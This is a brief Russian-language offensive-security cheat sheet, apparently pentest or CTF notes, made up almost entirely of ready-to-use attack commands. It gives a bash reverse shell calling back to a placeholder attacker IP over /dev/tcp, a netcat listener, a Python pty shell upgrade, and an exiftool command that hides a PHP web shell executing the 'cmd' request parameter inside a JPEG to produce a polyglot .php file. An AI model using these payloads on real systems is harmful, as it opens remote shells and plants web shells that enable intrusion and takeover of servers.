### Reverse Shell Generator
[revshells.com](https://www.revshells.com)

Проброс шелла:

```
bash -c "bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1"
```

Слушать:

```
sudo nc -lvnp 4444
```

Переход на удобный шелл:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Полиглотный шелл:

```
exiftool -DocumentName="<h1>chiara<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" <jpeg-file-name>.jpeg -o polyglot.php
```